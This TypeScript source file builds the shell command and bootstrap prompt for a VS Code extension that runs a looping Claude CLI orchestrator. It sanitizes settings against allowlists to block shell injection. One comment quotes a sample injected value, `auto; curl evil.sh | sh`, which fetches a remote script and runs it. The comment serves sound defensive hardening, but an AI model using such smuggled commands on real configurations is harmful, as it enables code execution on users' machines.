// Pure loop-command builder. No vscode imports so it is unit-testable in Docker.
import {
  LoopId, LOOPS, Model, NO_REVIEW, TaskDefaults, TASK_DEFAULTS, EffortRange, isModel, isReviewerValue,
  isValidEffort, sanitizeGroomConcurrency, sanitizeEffortRange, isNarrowed,
} from './model';

// Allowlist for `--permission-mode`, mirroring the `loopBoard.permissionMode` enum in package.json.
// This value is spliced UNQUOTED into the loop terminal shell command (buildClaudeBase). package.json's
// enum only constrains the Settings UI — a repo-supplied `.vscode/settings.json` can set it to any
// string (e.g. `auto; curl evil.sh | sh`), which would execute when the user starts a loop. So the
// value MUST be validated before it reaches the shell line; an off-list value falls back to 'auto'.
export const PERMISSION_MODES = ['auto', 'acceptEdits', 'bypassPermissions', 'dontAsk', 'default', 'plan'];
export function isValidPermissionMode(s: string): boolean {
  return PERMISSION_MODES.indexOf(s) !== -1;
}
export function sanitizePermissionMode(s: string): string {
  return isValidPermissionMode(s) ? s : 'auto';
}

// The loop interval rides into the `/loop <interval> …` bootstrap prompt (buildLoopCommand). Restrict
// it to a plain positive minute count so a settings-supplied value can't smuggle anything else onto the
// line. Minutes only (no s/h/d, owner decision). The setting is an integer; a pre-integer string value
// (`5`, `5m`) is still read so an existing user setting keeps working. Invalid falls back to '1m'.
const LOOP_INTERVAL_RE = /^[1-9]\d*m?$/;
export function isValidLoopInterval(v: number | string): boolean {
  return LOOP_INTERVAL_RE.test(String(v));
}
export function sanitizeLoopInterval(v: number | string): string {
  if (!isValidLoopInterval(v)) return '1m';
  const s = String(v);
  return s.endsWith('m') ? s : `${s}m`;
}

// Build the `claude …` invocation prefix (everything before the /loop prompt argv). The `--model`
// is the orchestrator's alias (`loopBoard.orchestrator.model`); a model id override reaches the CLI
// through the terminal env (aliasEnv), never this line. It stays single-quoted because a string with
// shell glob metacharacters (`[` `]`, e.g. `opus[1m]`) would otherwise be glob-expanded by zsh, and
// the caller still checks it with isValidModelString (no single quote), so the wrap is safe.
// permissionMode is spliced unquoted, so it is sanitized to the package.json enum here (invalid ->
// 'auto'); never trust a raw config value on the shell line.
//
// `sessionName` (t-2b89) is `--name loopboard-<loop>-<suffix>`: the ONLY thing that tells this
// loop's Claude session from any other in `~/.claude/sessions/*.json` (the session file records no
// ppid). It is derived from the fixed loop id, never from configuration, so it needs no quoting or
// escaping. Preferred over pinning `--session-id` because `/clear` starts a NEW session id in the
// same process: the name survives, the id does not.
//
// `effort` (t-cffc) is `loopBoard.orchestrator.effort`, passed as `--effort <level>` on EVERY
// spawn, the loop session's reasoning effort only; each subagent gets its effort per spawn.
// Spliced unquoted, so it is validated against EFFORT_LEVELS here (invalid/absent -> 'low'),
// the same hardening as permissionMode — a raw config value never reaches the shell line.
export function buildClaudeBase(permissionMode: string, modelString: string, sessionName?: string, effort?: string): string {
  const name = sessionName ? ` --name ${sessionName}` : '';
  const level = typeof effort === 'string' && isValidEffort(effort) ? effort : 'low';
  return `claude --permission-mode ${sanitizePermissionMode(permissionMode)} --model '${modelString}' --effort ${level}${name}`;
}

// What the orchestrator's bootstrap prompt carries besides the interval (t-0e99). Sync copies
// LOOP.md's marked blocks byte for byte with no interpolation, so LOOP.md can carry the BEHAVIOUR
// but never a configured value: the cap, the enabled task models and the five defaults ride here.
export interface LoopPromptConfig {
  groomConcurrency?: number;
  // Enabled task model ids, in display order, each with its effort floor/ceiling (t-0e99 FB7).
  models: readonly ({ id: string } & Partial<EffortRange>)[];
  defaults: TaskDefaults;
}

// Build the tiny bootstrap prompt pasted into the orchestrator's terminal: it names the role, the
// interval, the grooming cap, the enabled task models (a narrowed effort range as `<min>-<max>`
// beside its model, which the template clamps every spawn into) and the defaults (`<model>
// <effort>`); the loop reads the full standing instructions from `.loopboard/LOOP.md`'s
// ## Automation section on every pass (so editing that section retunes a running loop). The
// orchestrator's OWN effort is NOT here (t-cffc): it is a `claude --effort` startup flag
// (buildClaudeBase). It names NO model of its own: a prompt saying "You are running
// as model ..." is the legacy per-model loop the template's guard tells to stand down.
//
// Every value is spliced into a single-quoted shell argv, so each one is re-validated against its
// allowlist here (a hostile setting falls back to the shipped default) and the result stays
// apostrophe-free and under 300 chars.
//
// LOOP.md contains several fenced blocks (layout, workflow, grammars), so we must NOT grab the
// first fence: slice from the `## Automation` heading to the next `## ` heading (or EOF), and
// require a fenced block inside that slice. No block -> undefined (caller warns).
export function buildLoopCommand(loopText: string, interval: number | string, cfg: LoopPromptConfig): string | undefined {
  const lines = loopText.split('\n');
  let start = -1;
  for (let i = 0; i < lines.length; i++) {
    if (/^##\s+Automation\b/i.test(lines[i])) {
      start = i;
      break;
    }
  }
  if (start < 0) return undefined;
  let end = lines.length;
  for (let i = start + 1; i < lines.length; i++) {
    if (/^##\s+/.test(lines[i])) {
      end = i;
      break;
    }
  }
  const section = lines.slice(start, end).join('\n');
  if (!/```[^\n]*\n[\s\S]*?```/.test(section)) return undefined;

  const groomCap = sanitizeGroomConcurrency(cfg.groomConcurrency);
  const models = (cfg.models || []).filter((m) => m && isModel(m.id)).map((m) => {
    const r = sanitizeEffortRange(m.minEffort, m.maxEffort);
    return isNarrowed(r) ? `${m.id} ${r.minEffort}-${r.maxEffort}` : m.id;
  });
  const d = cfg.defaults || TASK_DEFAULTS;
  const pick = <T>(v: unknown, ok: (x: unknown) => x is T, dflt: T): T => (ok(v) ? v : dflt);
  const groomer: Model = pick(d.groomer, isModel, TASK_DEFAULTS.groomer);
  const groomerEffort = pick(d.groomerEffort, isValidEffort, TASK_DEFAULTS.groomerEffort);
  const worker: Model = pick(d.worker, isModel, TASK_DEFAULTS.worker);
  const workerEffort = pick(d.workerEffort, isValidEffort, TASK_DEFAULTS.workerEffort);
  const reviewer = pick(d.reviewer, isReviewerValue, TASK_DEFAULTS.reviewer);
  const reviewerEffort = pick(d.reviewerEffort, isValidEffort, TASK_DEFAULTS.reviewerEffort);
  return (
    `/loop ${sanitizeLoopInterval(interval)} You are the LoopBoard orchestrator, grooming cap ${groomCap}. ` +
    `Models: ${models.length ? models.join(', ') : 'none'}. ` +
    `Defaults: groomer ${groomer} ${groomerEffort}, worker ${worker} ${workerEffort}, reviewer ${reviewer === NO_REVIEW ? NO_REVIEW : `${reviewer} ${reviewerEffort}`}. ` +
    `Follow the Automation section of .loopboard/LOOP.md on every pass.`
  );
}

// The terminal a loop runs in (t-0e99): `Claude Orchestrator`. The ONLY terminal name LoopBoard
// creates; the per-model `Claude <Model>` terminals are legacy.
export function loopTerminalName(loop: LoopId): string {
  const label = LOOPS.find((l) => l.id === loop)?.label ?? loop;
  return 'Claude ' + label;
}

// Names of the per-model loop terminals LoopBoard used to open, one per slot. VSCode can revive a
// terminal across a reload, so these may still be running the old per-model loop after the
// update; activation offers to stop them (t-0e99).
export const LEGACY_LOOP_TERMINALS = ['Claude Opus', 'Claude Sonnet', 'Claude Fable'];

export function legacyLoopTerminals(names: readonly string[]): string[] {
  return names.filter((n) => LEGACY_LOOP_TERMINALS.includes(n));
}

// Loop-row click decision (t-9c3f). The row that last revealed its terminal toggles the whole
// bottom panel (`workbench.action.togglePanel`, the command ⌘J runs), so each click flips the
// panel's REAL state even after an external ⌘J hide/show; any other row (or nothing revealed yet)
// shows its own terminal. VS Code exposes no panel-visibility API, so the toggle is the only way to
// act on the actual state rather than a cached guess.
export function revealStep(revealed: LoopId | undefined, loop: LoopId): 'togglePanel' | 'show' {
  return revealed === loop ? 'togglePanel' : 'show';
}
